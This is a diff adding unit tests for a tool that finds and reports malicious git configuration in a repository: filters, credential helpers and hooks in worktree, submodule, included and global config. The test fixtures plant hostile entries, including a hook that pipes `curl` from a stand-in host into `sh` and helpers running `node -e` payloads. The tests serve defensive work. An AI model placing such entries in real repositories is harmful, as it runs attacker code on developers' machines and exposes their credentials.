@@ -520,6 +520,77 @@ class TestAFilterGitRequiresKeepsItsCommands(_GitSettingsCheckout):
         self.assertIn("filter git requires", _said(result))
 
 
+class TestAValueFollowsTheSameRules(_GitSettingsCheckout):
+
+    def test_a_filter_another_worktree_requires_keeps_its_commands(self):
+        self.git(self.root, "config", "extensions.worktreeConfig", "true")
+        tree = self.root / "trees" / "wt"
+        self.git(self.root, "worktree", "add", "-q", str(tree))
+        self.git(tree, "config", "--worktree", "filter.x.required", "true")
+        self.configure(f'[filter "x"]\n\tclean = node -e "{PAYLOAD}"\n\tsmudge = node -e "{PAYLOAD}"\n')
+        result = self.checkout()
+        self.assertEqual([f"node -e {PAYLOAD}"], self.values("filter.x.clean"))
+        self.assertIn("filter git requires", _said(result))
+
+    def test_a_value_in_a_submodules_own_settings_is_left(self):
+        library = self.new_repo("library")
+        self.write(library, "lib.js", "export const x = 1;\n")
+        self.commit(library, "a library")
+        self.git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library),
+                 "sub")
+        module = self.root / ".git" / "modules" / "sub" / "config"
+        with open(module, "a", encoding="utf-8") as fh:
+            fh.write(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n')
+        before = module.read_bytes()
+        result = self.checkout()
+        self.assertEqual(before, module.read_bytes())
+        self.assertIn("submodule", _said(result))
+
+    def test_a_value_in_a_file_git_cannot_open_is_left(self):
+        phantom = self.root / ".git" / "phantom.cfg"
+        phantom.write_text(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n', encoding="utf-8")
+        self.configure("[include]\n\tpath = gone/../phantom.cfg\n")
+        before = phantom.read_bytes()
+        result = self.checkout()
+        self.assertEqual(before, phantom.read_bytes())
+        self.assertIn("does not read", _said(result))
+
+
+class TestNothingLeftIsCalledTakenOut(_GitSettingsCheckout):
+
+    def test_a_hook_left_before_one_taken_out_keeps_the_fix_held_back(self):
+        self.configure('[hook "audit"]\n\tcommand = curl -fsS https://example.invalid/p | sh\n'
+                       '\tevent = pre-commit\n' + self.payload_hook())
+        (self.root / "notes.md").write_text("my own work\n")
+        result = self.checkout()
+        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
+        self.assertIn("is still in place", _said(result))
+        self.assertEqual("", self.git_may_fail(self.root, "for-each-ref", "refs/heads/saw").stdout)
+
+    def test_a_submodules_hook_of_the_same_name_is_judged_on_its_own(self):
+        library = self.new_repo("library")
+        self.write(library, "lib.js", "export const x = 1;\n")
+        self.commit(library, "a library")
+        self.git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library),
+                 "sub")
+        self.configure(self.payload_hook())
+        with open(self.root / ".git" / "modules" / "sub" / "config", "a", encoding="utf-8") as fh:
+            fh.write(self.payload_hook())
+        result = self.checkout()
+        self.assertFalse(result.complete)
+        self.assertIn("submodule", _said(result))
+
+    def test_a_value_git_still_reads_from_the_operators_settings_is_named(self):
+        mine = self.root.parent / "operator.gitconfig"
+        mine.write_text(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n', encoding="utf-8")
+        self.configure(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n')
+        with mock.patch.dict(os.environ, {"GIT_CONFIG_GLOBAL": str(mine)}):
+            result = self.checkout()
+        self.assertFalse(result.complete)
+        self.assertEqual([], self.values("credential.helper"))
+        self.assertIn("your own git settings", _said(result))
+
+
 class TestTheVerbIsDeclaredAsData(unittest.TestCase):
 
     def test_the_signature_names_the_verb_the_fix_carries_out(self):
